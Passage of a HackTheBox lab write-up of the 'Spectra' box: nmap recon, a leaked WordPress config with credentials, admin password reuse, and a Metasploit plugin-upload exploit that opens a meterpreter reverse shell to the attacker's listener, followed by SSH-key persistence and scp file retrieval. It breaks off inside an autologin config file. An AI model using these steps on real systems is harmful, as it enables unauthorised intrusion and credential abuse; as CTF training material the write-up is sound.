@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Spectra - HackTheBox Writeup (10.10.10.229)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Spectra - HackTheBox Writeup (10.10.10.229)">
+  
+    <meta name="description" content="Easy-difficulty ChromeOS box with a focus on password reuse on WordPress. Privilege escalation by leveraging sudo rights on initctl to create a new malicious service and gain root access.">
+    <meta property="og:description" content="Easy-difficulty ChromeOS box with a focus on password reuse on WordPress. Privilege escalation by leveraging sudo rights on initctl to create a new malicious service and gain root access.">
+  
+  
+    <meta property="og:image" content="https://www.hackthebox.eu/storage/avatars/e679d95b5553a6927d1dc4ffe0885ea8.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/e679d95b5553a6927d1dc4ffe0885ea8.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">Spectra - HackTheBox Writeup (10.10.10.229)</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Mon, Jul 5, 2021</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/WordPress">WordPress</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--brown">
+            <a href="tag/Password_Reuse">Password Reuse</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/SUID_Binary">SUID Binary</a>
+          </span>
+        
+      </div>
+      <div>
+        Easy-difficulty ChromeOS box with a focus on password reuse on WordPress. Privilege escalation by leveraging sudo rights on initctl to create a new malicious service and gain root access.
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/1cc62514af574c16a9a7967d5eeab189" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/b46ef841c9954fe0a6cbd0add460aabe" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/b46ef841c9954fe0a6cbd0add460aabe"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/e6b7db20289148a4b714c0f88790d1a5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/e67f2a70fe9d4a21ad291aa5acd23243" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.229 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/287c0d265050489585586718b95c9871" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql</span></span></span></code></pre></li><li id="https://www.notion.so/f76a8d0850d84db4b9a6798832b2949c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/b8741b91fc7548f6a9e462b9b75b36b1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 22,80,3306 10.10.10.229 &gt; targeted.nmap</code></span></span></p></div><pre id="https://www.notion.so/b4d63baa820d44db99e62d27764d12c0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey: 
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
+80/tcp   open  http    nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesn&#x27;t have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span></span></span></code></pre><div id="https://www.notion.so/1bd32dc107d144f7abfb2de967d321ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">OpenSSH 8.1, nginx 1.17.4, MySQL</span></span></p></div></li></ul><h2 id="https://www.notion.so/c2b000f047514e56a1785f35bf306821" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/c2b000f047514e56a1785f35bf306821"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/17c4cc267ef94bfbb314c1dfc7a5dcc4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Add vhost to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/4e34072549a24f12a25ea004a5a66d81" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.10.10.229    spectra.htb</span></span></span></code></pre></li></ul><div id="https://www.notion.so/7cb82dd2f2f540c28c627fa3a78bf531" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">MySQL Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/c13e963d929547d782df173ec2c4d6d1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Connecting to database with MySQL client:</span></span><div id="https://www.notion.so/c9e4655b41254cff8c4f9ccb1b9190cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ mysql -h spectra.htb</code></span></span></p></div><pre id="https://www.notion.so/2f14aaab89a14beab52c82b41520eb06" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ERROR 1130 (HY000): Host &#x27;10.10.14.103&#x27; is not allowed to connect to this MySQL server</span></span></span></code></pre></li><li id="https://www.notion.so/a70b7835f6df46d6a6b30ce1a70542a4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looks like there is some sort of IP whitelist which blocked our connection, moving on...</span></span></li></ul><div id="https://www.notion.so/34cd48864a6e493fbd1749d8d7fae59e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HTTP Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/96004d67384d41d1b2d8360e86d48a42" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Website is an issue tracker under construction:</span></span><div id="https://www.notion.so/33de21481ee24e288922cc85402bb2fd" class="Image Image--Normal"><figure><a href="https://i.imgur.com/ci5I3zF.png?width=624"><img src="https://i.imgur.com/ci5I3zF.png?width=624" style="width:624px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/c537b3c9bc74464693cc2f8a83d1b51e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">First link is to the main branch at </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></span><span class="SemanticString">, while second link is to the staging branch at </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/62f6e349c6f64db4a388048cba0742af" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Webserver is running PHP 5.6.40, this could be useful for getting a reverse shell if we could upload arbitrary files to the server.</span></span></li><li id="https://www.notion.so/1b67d10a3f044eada1247a0ebdd8ef80" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigating to the first link &quot;Software Issue Tracker&quot; brings us to a WordPress site:</span></span><div id="https://www.notion.so/dac463cfcc0f4798ac4bc924f8690253" class="Image Image--Normal"><figure><a href="https://i.imgur.com/phe7Cx5.png?width=1056"><img src="https://i.imgur.com/phe7Cx5.png?width=1056" style="width:1056px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/e7f7158603bf44e1b26073a45c9e8129" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found WordPress login page:</span></span><div id="https://www.notion.so/e93335ed9fa449dc96685e5910696058" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://spectra.htb/main/wp-login.php">http://spectra.htb/main/wp-login.php</a></span></span></p></div></li><li id="https://www.notion.so/3352ae8f784e4ff48f3fdb73a4b42eb8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Comment feature seems to be vulnerable to XSS, but they require moderation before they can be displayed to other users:</span></span><div id="https://www.notion.so/d2733b6baa1e4c2bb03b24f10944058e" class="Image Image--Normal"><figure><a href="https://i.imgur.com/43AvnKS.png?width=528"><img src="https://i.imgur.com/43AvnKS.png?width=528" style="width:528px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/f71e8bf04b2141b6a0cdc8c88c159a1a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">XML-RPC is active on </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://spectra.htb/main/xmlrpc.php:">http://spectra.htb/main/xmlrpc.php</a></span><span class="SemanticString">, sending a POST request with Burp Suite with the following method call:</span></span><pre id="https://www.notion.so/134fd33d11b64fe5b152a139f62a7943" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>methodCall</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>methodName</span><span class="token punctuation">></span></span>
+    system.listMethods
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>methodName</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>params</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>params</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>methodCall</span><span class="token punctuation">></span></span></span></span></span></code></pre></li><li id="https://www.notion.so/1245efa5f7f84b8ab82d28e8f46a8c1e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We get the response:</span></span><pre id="https://www.notion.so/8a02e0087e3b4fd6943bae77780c1a1b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Deprecated: Automatically populating $HTTP_RAW_POST_DATA is deprecated and will be removed in a future version. To avoid this warning set &#x27;always_populate_raw_post_data&#x27; to &#x27;-1&#x27; in php.ini and use the php://input stream instead. in Unknown on line 0
+
+Warning: Cannot modify header information - headers already sent in Unknown on line 0
+system.multicall system.listMethods system.getCapabilities demo.addTwoNumbers demo.sayHello pingback.extensions.getPingbacks pingback.ping mt.publishPost mt.getTrackbackPings mt.supportedTextFilters mt.supportedMethods mt.setPostCategories mt.getPostCategories mt.getRecentPostTitles mt.getCategoryList metaWeblog.getUsersBlogs metaWeblog.deletePost metaWeblog.newMediaObject metaWeblog.getCategories metaWeblog.getRecentPosts metaWeblog.getPost metaWeblog.editPost metaWeblog.newPost blogger.deletePost blogger.editPost blogger.newPost blogger.getRecentPosts blogger.getPost blogger.getUserInfo blogger.getUsersBlogs wp.restoreRevision wp.getRevisions wp.getPostTypes wp.getPostType wp.getPostFormats wp.getMediaLibrary wp.getMediaItem wp.getCommentStatusList wp.newComment wp.editComment wp.deleteComment wp.getComments wp.getComment wp.setOptions wp.getOptions wp.getPageTemplates wp.getPageStatusList wp.getPostStatusList wp.getCommentCount wp.deleteFile wp.uploadFile wp.suggestCategories wp.deleteCategory wp.newCategory wp.getTags wp.getCategories wp.getAuthors wp.getPageList wp.editPage wp.deletePage wp.newPage wp.getPages wp.getPage wp.editProfile wp.getProfile wp.getUsers wp.getUser wp.getTaxonomies wp.getTaxonomy wp.getTerms wp.getTerm wp.deleteTerm wp.editTerm wp.newTerm wp.getPosts wp.getPost wp.deletePost wp.editPost wp.newPost wp.getUsersBlogs</span></span></span></code></pre></li><li id="https://www.notion.so/36799d153767450ebe3301701c487e56" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Which doesn&#x27;t seem to contain any useful function, moving on...</span></span></li><li id="https://www.notion.so/56aa7dc957724ca096762af152479f8f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We find the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">wp-config.php.save</code></span><span class="SemanticString"> file in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/testing</code></span><span class="SemanticString"> staging branch, containing the database credentials:</span></span><pre id="https://www.notion.so/ad1e5a47fb764b6394131da2406a07fe" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">/** MySQL database username */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'devtest'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL database password */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'devteam01'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span></code></pre></li><li id="https://www.notion.so/95477f8945234a2785bb91a0263f3c80" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">I wonder if they reused the same password for the WordPress administrator account... and of course they did:</span></span><div id="https://www.notion.so/ca7937b9cd2b4a688c1dce5a9cf5a85f" class="Image Image--Normal"><figure><a href="https://i.imgur.com/DU8KXXr.png?width=1296"><img src="https://i.imgur.com/DU8KXXr.png?width=1296" style="width:1296px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/c138b29a6d3146c98ee3839be662c4a0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found WordPress credentials:</span></span><div id="https://www.notion.so/0182eea836da451fac040567a9ef4b0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">administrator:devteam01</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/4e0ab33d41334f3e8958d1cd7ecac288" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/4e0ab33d41334f3e8958d1cd7ecac288"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/c89a53595ac94e048429a627da0d9ae8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Now that we can log in as the WordPress administrator, we can exploit the plugin upload feature with Metasploit module </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">exploit/unix/webapp/wp_admin_shell_upload</code></span><span class="SemanticString"> to get a shell:</span></span><div id="https://www.notion.so/58b8490ab177412ba2945a6b0456797e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ msfconsole</code></span></span></p></div><div id="https://www.notion.so/4200062f7a73489f9ab851a991010f92" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; use exploit/unix/webapp/wp_admin_shell_upload</code></span></span></p></div></li><li id="https://www.notion.so/33a1e8edf62a475881a48d3ea4bf5c1b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Configure the exploit parameters:</span></span><div id="https://www.notion.so/62e1269818644d63a764e7c6e906af18" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; set RHOSTS 10.10.10.229</code></span></span></p></div><div id="https://www.notion.so/f68a37b0e137426c908269ebaf7ec3ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; set USERNAME administrator</code></span></span></p></div><div id="https://www.notion.so/671351205064458ba33e6e3825bb10b4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; set PASSWORD devteam01</code></span></span></p></div><div id="https://www.notion.so/2b357843181b4d3487ee019a5e35f2a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; set LHOST 10.10.14.103</code></span></span></p></div></li><li id="https://www.notion.so/03c3050a9e144b4095bb02766af611dd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Execute the payload, and we should get a meterpreter shell:</span></span><div id="https://www.notion.so/84af841e9e1b4cbda94ff7a15a31adfb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; run</code></span></span></p></div><pre id="https://www.notion.so/bd50659568a140a99734a84351006afc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[*] Started reverse TCP handler on 10.10.14.103:4444 
+[*] Authenticating with WordPress using administrator:devteam01...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /main/wp-content/plugins/KldVlQaCdp/KxOTdTXpFm.php...
+[*] Sending stage (39282 bytes) to 10.10.10.229
+[*] Meterpreter session 2 opened (10.10.14.103:4444 -&gt; 10.10.10.229:36144) at 2021-04-08 22:19:22 +0930
+[+] Deleted KxOTdTXpFm.php
+[+] Deleted KldVlQaCdp.php
+[+] Deleted ../KldVlQaCdp</span></span></span></code></pre></li><li id="https://www.notion.so/55b0fc3aaf6f4144931b0b5964cfab59" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Spawn a shell instance:</span></span><div id="https://www.notion.so/de64102a994d43ef8ff2f55b3897d3a9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; shell</code></span></span></p></div><div id="https://www.notion.so/efe4998602a64c0fa50f2efaeffd1706" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/8bd6d160170d4195b137a28e1922e3b4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>nginx
+uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)</span></span></span></code></pre></li><li id="https://www.notion.so/586e72e5347840698f3f70cbcc9afdf7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Before going further, let&#x27;s upgrade our shell. We can do so by spawning a TTY:</span></span><div id="https://www.notion.so/9f9ce6c54ede4359a384a391a07fecc9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; /dev/shm/upgrade.py</code></span></span></p></div><div id="https://www.notion.so/3fdf41b7928f43d5974951e0b6fbbc00" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python /dev/shm/upgrade.py</code></span></span></p></div></li><li id="https://www.notion.so/f2c149c5931a47a996522f0af8926ed0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Alternatively, we can also add our SSH public key in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString">, and SSH in to get tab-completion and the ability to use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">scp</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/e0e898a8edf9456394e2f881cee28f0a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ &quot;echo &lt;id_rsa&gt;&quot; &gt; ~/.ssh/authorized_keys</code></span></span></p></div><div id="https://www.notion.so/ff16e3819ff34ed3b4d5d020451cc17e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh nginx@spectra.htb -i ~/.ssh/id_rsa</code></span></span></p></div></li><li id="https://www.notion.so/1fbd64135861432c9942351241d98e9b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking for other users in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/</code></span><span class="SemanticString"> directory:</span></span><div id="https://www.notion.so/483a89e9a65547abbe21d0ae50df95be" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls -la /home/</code></span></span></p></div><pre id="https://www.notion.so/33855ec050ee4549bed9c787b2c6e85f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>drwxr-xr-x  8 root    root    4096 Feb  2 15:55 .
+drwxr-xr-x 22 root    root    4096 Feb  2 14:52 ..
+drwx------  4 root    root    4096 Jul 20  2020 .shadow
+drwxr-xr-x 20 chronos chronos 4096 Apr  7 21:32 chronos
+drwxr-xr-x  4 katie   katie   4096 Feb 10 00:38 katie
+drwxr-xr-x  5 nginx   nginx   4096 Apr  8 06:12 nginx
+drwxr-x--t  4 root    root    4096 Jul 20  2020 root
+drwxr-xr-x  4 root    root    4096 Jul 20  2020 user</span></span></span></code></pre></li><li id="https://www.notion.so/ecef1eb08d754d70b33d14fa5c9a6d93" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found possible usernames:</span></span><div id="https://www.notion.so/e3931005fbe94de5b14226fd7f54e38a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">chronos, katie, user</span></span></p></div></li><li id="https://www.notion.so/90efc5eb49254b289b24c159f4bd5974" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">While enumerating for files, we stumbled upon a ChromeOS autologin script in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/</code></span><span class="SemanticString"> directory:</span></span><div id="https://www.notion.so/5db3c4d9d8ab40cc8fa1925d2c653456" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls /opt/</code></span></span></p></div><pre id="https://www.notion.so/4c09e1d75fe7414381eead398fa91e16" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>-rw-r--r--  1 root root  978 Feb  3 16:02 autologin.conf.orig</span></span></span></code></pre></li><li id="https://www.notion.so/fd8304a72bb34c698419bd26b4aed95a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Download the file with scp:</span></span><div id="https://www.notion.so/70e83defe7ae44cb8dab682d35e3c4f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ scp -i ~/.ssh/id_rsa nginx@spectra.htb:/opt/autologin.conf.orig .</code></span></span></p></div></li><li id="https://www.notion.so/4f015892d4184256babef9e887cca50d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">autologin.conf.orig</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/6bc269be742a496d801d6e2a76c800d3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># Copyright 2016 The Chromium OS Authors. All rights reserved.
+# Use of this source code is governed by a BSD-style license that can be
+# found in the LICENSE file.
+description   &quot;Automatic login at boot&quot;
+author        &quot;chromium-os-dev@chromium.org&quot;
+# After boot-complete starts, the login prompt is visible and is accepting
+# input.
+start on started boot-complete
+script
+  passwd=
+  # Read password from file. The file may optionally end with a newline.
+  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
